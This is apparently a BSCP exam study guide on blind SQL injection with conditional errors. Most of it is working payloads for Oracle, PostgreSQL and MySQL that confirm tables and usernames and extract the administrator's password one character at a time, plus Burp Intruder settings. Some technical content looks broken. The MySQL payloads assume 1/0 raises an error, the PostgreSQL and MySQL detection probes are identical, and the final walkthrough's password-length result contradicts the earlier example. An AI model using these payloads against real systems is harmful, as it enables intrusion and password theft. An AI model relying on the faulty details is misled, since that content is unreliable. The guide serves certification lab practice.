# Blind SQL Injection with Conditional Errors - BSCP Exam Guide

## Core Concept

Conditional error-based blind SQL injection uses database error messages as an information channel. The key difference from standard blind SQL injection is that we don't rely on application response content changes - we trigger database errors conditionally to extract information.

**How it works:**
- The application doesn't filter errors properly and displays them to the user
- We craft queries that cause errors (like divide-by-zero) only when our condition is true
- Different HTTP response codes or error messages confirm whether our condition was evaluated as true or false

---

## Initial Vulnerability Detection

### Step 1: Confirm SQL Injection Exists

Test if the application is vulnerable by causing intentional errors:

```
Basic error test:
'
```

Response: Database error or 500 Internal Server Error indicates SQL vulnerability

```
If simple quote causes error, try breaking out:
'' 
```

Response: 200 OK might indicate quote is escaped

### Step 2: Identify the Database Type

This is critical because error-based payloads differ by database:

```
For Oracle (common in BSCP labs):
' || (SELECT '' FROM DUAL) || '
```

Response: 200 OK = Oracle confirmed (Oracle requires FROM clause with DUAL table)

```
For PostgreSQL:
' || (SELECT '') || '
```

```
For MySQL:
' || (SELECT '') || '
```

**Why this matters:** Oracle uses SUBSTR instead of SUBSTRING, uses TO_CHAR for type conversion, and requires DUAL table. Different databases have different syntax for CASE statements.

---

## The Conditional Error Technique

### Basic Template for Oracle

```
' || (SELECT CASE WHEN (CONDITION) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
```

**How it works:**
- The CASE statement evaluates your CONDITION
- If TRUE: executes 1/0 (divide by zero error) → HTTP 500 error
- If FALSE: returns empty string '' → HTTP 200 OK
- The 1/0 only triggers if condition is true
- TO_CHAR converts the result to string (required by Oracle)

### Basic Template for PostgreSQL

```
' || (SELECT CASE WHEN (CONDITION) THEN 1/0 ELSE '' END) || '
```

**Difference:** PostgreSQL doesn't require FROM DUAL or TO_CHAR conversion

### Basic Template for MySQL

```
' AND (SELECT IF(CONDITION, 1/0, '')) 
```

**Difference:** MySQL uses IF instead of CASE WHEN

---

## Step-by-Step Lab Walkthrough: Table Discovery

### Step 1: Confirm the Database Type (Oracle Example)

```
Payload:
' || (SELECT '' FROM DUAL) || '

Expected: 200 OK response
Meaning: Confirmed Oracle database
```

### Step 2: Test the CASE WHEN Syntax

Test with a false condition:

```
Payload:
' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '

Expected: 200 OK
Meaning: False condition returns empty string (no error)
```

Test with a true condition:

```
Payload:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '

Expected: 500 Internal Server Error
Meaning: True condition triggers divide-by-zero error
```

**If responses are different (200 vs 500): You can proceed with error-based extraction**

### Step 3: Confirm Table Exists

First test without CASE (just to see if table exists):

```
Payload:
' || (SELECT '' FROM users WHERE ROWNUM=1) || '

Expected: 200 OK if table exists, 500 error if doesn't exist
Note: ROWNUM=1 limits results to first row
```

Now test with CASE WHEN to confirm:

```
Payload:
' || (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE ROWNUM=1) || '

Expected: 200 OK
Meaning: Table "users" exists
```

If you get 500 error on the table name, that table doesn't exist - try another name.

---

## Step-by-Step Lab Walkthrough: Finding Usernames

### Test if Specific Username Exists

Use the CASE statement to conditionally error based on finding a username:

```
Payload:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

Expected: 500 Internal Server Error
Meaning: The WHERE clause found a row (username exists)
```

Compare with a non-existent username:

```
Payload:
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='nonexistent') || '

Expected: 200 OK
Meaning: The WHERE clause found no rows (username doesn't exist)
```

**Why different responses?**
- When username='administrator' exists, the CASE statement executes (1=1 is true, triggers 1/0 error)
- When username='nonexistent' doesn't exist, WHERE clause matches no rows, CASE never executes, no error occurs

---

## Step-by-Step Lab Walkthrough: Finding Password Length

### Determine Password Length

Test different lengths incrementally:

```
Payload (testing if length > 19):
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>19) || '

Expected: 500 Internal Server Error
Meaning: Password is longer than 19 characters
```

```
Payload (testing if length > 20):
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>20) || '

Expected: 200 OK
Meaning: Password is NOT longer than 20 characters
Conclusion: Password is exactly 20 characters
```

**Methodology:**
- Test length>1, >2, >5, >10, >15, >19, >20 etc. until you find the boundary
- Once you know length is X, you know exact password length
- Use binary search approach to be faster (test >10, if true test >15, etc.)

---

## Step-by-Step Lab Walkthrough: Extracting Password Characters

### Finding Each Character Position

Use SUBSTR function (Oracle) to check individual characters:

```
Payload (checking first character):
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '

Expected: If first character is 'a' → 500 error
          If first character is not 'a' → 200 OK
```

### Manual Character Testing (Slow Method)

Test each character one by one:

```
For first character, try:
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='b') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='c') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
...and so on

When you get 500 error: That's the correct character
```

### Automated Character Extraction with Burp Intruder (Faster Method)

This is the recommended approach for BSCP exam:

**Setup:**
1. Send your request to Burp Intruder
2. Modify payload to: `' || (SELECT CASE WHEN (SUBSTR(password,1,1)='X') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '`
3. Highlight the 'X' character
4. Set payload type to "Simple list"
5. Add all possible characters: a-z, A-Z, 0-9, and special characters

**Run attack and look for:**
- One payload returns 500 error
- All others return 200 OK
- The character that causes 500 error is the correct character

**For second character, modify:**
```
' || (SELECT CASE WHEN (SUBSTR(password,2,1)='X') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

**For position N, modify:**
```
' || (SELECT CASE WHEN (SUBSTR(password,N,1)='X') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

Repeat for all 20 character positions to extract complete password.

---

## Database-Specific Payload Reference

### Oracle Database Payloads

Table discovery:
```
' || (SELECT '' FROM DUAL) || '
' || (SELECT '' FROM users WHERE ROWNUM=1) || '
```

Conditional error test:
```
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
```

Username exists check:
```
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

Password length check:
```
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>20) || '
```

Character extraction:
```
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

### PostgreSQL Database Payloads

Conditional error test:
```
' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END) || '
```

Username exists check:
```
' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM users WHERE username='administrator') || '
```

Password length check:
```
' || (SELECT CASE WHEN (1=1) THEN 1/0 ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>20) || '
```

Character extraction:
```
' || (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN 1/0 ELSE '' END FROM users WHERE username='administrator') || '
```

### MySQL Database Payloads

Conditional error test:
```
' AND (SELECT IF((1=1), 1/0, 'a'))
```

Username exists check:
```
' AND (SELECT IF((SELECT COUNT(*) FROM users WHERE username='administrator')=1, 1/0, 'a'))
```

Password length check:
```
' AND (SELECT IF((SELECT LENGTH(password) FROM users WHERE username='administrator' AND LENGTH(password)>20)=1, 1/0, 'a'))
```

Character extraction:
```
' AND (SELECT IF((SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a', 1/0, 'a'))
```

---

## Quick Reference Cheatsheet

### Decision Tree: Which Response Indicates True Condition?

```
Oracle/PostgreSQL with 1/0 error:
- TRUE condition → 500 error
- FALSE condition → 200 OK

MySQL with IF statement:
- Same behavior (500 vs 200)
```

### Critical Syntax Elements

| Element | Purpose | Example |
|---------|---------|---------|
| CASE WHEN | Conditional execution | CASE WHEN (condition) THEN error ELSE '' END |
| TO_CHAR() | Oracle type conversion | TO_CHAR(1/0) |
| SUBSTR | Extract substring (Oracle) | SUBSTR(password,1,1) |
| SUBSTRING | Extract substring (MySQL/PostgreSQL) | SUBSTRING(password,1,1) |
| LENGTH | Get string length | LENGTH(password) |
| 1/0 | Divide by zero error | Triggers error in error handler |
| ROWNUM | Oracle row limiter | WHERE ROWNUM=1 |
| DUAL | Oracle dummy table | FROM DUAL |
| \|\| | String concatenation (Oracle/PostgreSQL) | 'a' \|\| 'b' |

### Payload Construction Formula

```
[Comment character] || (SELECT CASE WHEN (YOUR_CONDITION_HERE) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || [Comment character]
```

---

## Common Issues and Troubleshooting

### Issue: Getting 200 OK for everything

**Possible causes:**
1. Wrong database type - test with different syntax
2. Table name is wrong - try 'user', 'account', 'admin_users'
3. Column name is wrong - try 'user', 'name', 'login'
4. Using semicolon at end which terminates query - remove it
5. Error messages are suppressed - check if errors appear elsewhere (comments section, page title)

**Solution:** Verify database type first with simple payloads, then confirm table existence.

### Issue: Getting 500 error for all conditions

**Possible causes:**
1. Syntax error in payload - check brackets and quotes
2. CASE WHEN syntax wrong for this database
3. FROM DUAL missing (Oracle specific)
4. Table/column doesn't exist

**Solution:** Test basic syntax first without conditions.

### Issue: SUBSTR vs SUBSTRING confusion

**Oracle uses:** SUBSTR(string, position, length)
**MySQL/PostgreSQL use:** SUBSTRING(string, position, length)

Always verify which database first before using character extraction payloads.

### Issue: Can't find administrator username

**Try:**
- admin
- root
- test
- user1
- Check if usernames are case-sensitive (try 'Administrator', 'ADMINISTRATOR')
- Query information_schema for actual table/column names

### Issue: Password characters include special symbols

**Remember to include in Burp Intruder payload list:**
- Numbers: 0-9
- Lowercase: a-z
- Uppercase: A-Z
- Common special: !@#$%^&*-_=+

---

## Burp Intruder Setup For Exam

### For Character Extraction (Recommended Method)

**Request positioning:**
```
Original payload with marker:
' || (SELECT CASE WHEN (SUBSTR(password,1,1)='§X§') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
```

**Payload settings:**
- Payload type: Simple list
- Add payloads: abcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*-_
- OR use "Add from file" if you have character list saved

**Analyzing results:**
- Sort by "Length" or "Response code"
- Look for 500 error (different from 200 OK responses)
- The character that causes 500 is correct

**Processing:**
- Once you find char 1, increment position number and repeat
- Continue until you have all characters
- Concatenate results to get full password

### For Length Discovery (Optional)

**Request positioning:**
```
' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>§20§) || '
```

**Payload settings:**
- Payload type: Numbers
- From: 1, To: 50, Step: 1
- Run attack

**Analyzing results:**
- Note which numbers cause 500 error
- Boundary where 200 OK starts = password length

---

## Final Checklist Before Submitting

Before you claim to have the password, verify:

```
[ ] Database type confirmed (Oracle/MySQL/PostgreSQL)
[ ] Table name verified to exist
[ ] Username verified to exist
[ ] Password length determined
[ ] All character positions tested
[ ] Special characters considered
[ ] Case sensitivity tested (if needed)
[ ] Password extracted matches expected format
[ ] Successfully logged in with credentials
```

---

## Time-Saving Tips for Exam

1. **Database identification first** - Saves 20 minutes of wrong syntax attempts
2. **Use Intruder from start** - Manual testing of 20+ positions is too slow
3. **Save successful payloads** - Template them for reuse in different labs
4. **Test with 'administrator'** - Most labs use this default username
5. **Verify password before final answer** - Log in to confirm
6. **Check page errors carefully** - Sometimes error details appear in HTML comments or page source, not just HTTP response

---

## Lab Completion Example Walkthrough

```
Step 1: Payload = ' || (SELECT '' FROM DUAL) || '
Result = 200 OK
Conclusion = Oracle database confirmed

Step 2: Payload = ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM DUAL) || '
Result = 500 error
Conclusion = Error-based blind SQLi confirmed

Step 3: Payload = ' || (SELECT '' FROM users WHERE ROWNUM=1) || '
Result = 200 OK
Conclusion = users table exists

Step 4: Payload = ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') || '
Result = 500 error
Conclusion = Username 'administrator' exists

Step 5: Payload = ' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>20) || '
Result = 500 error → try >25 → 200 OK
Conclusion = Password is 21-24 characters

Step 6: Use Burp Intruder on position 1-N with character list
Result = Find each character by 500 error response
Conclusion = Get complete password like "abc123xyz..."

Step 7: Login with administrator / abc123xyz...
Result = Success
Done!
```

---

## Remember

The key difference with error-based blind SQL injection is that you're reading information from the database error, not from application response content. Always ensure you understand which response (200 vs 500) indicates true vs false before extracting data. Use Burp Intruder to automate the tedious character-by-character extraction process.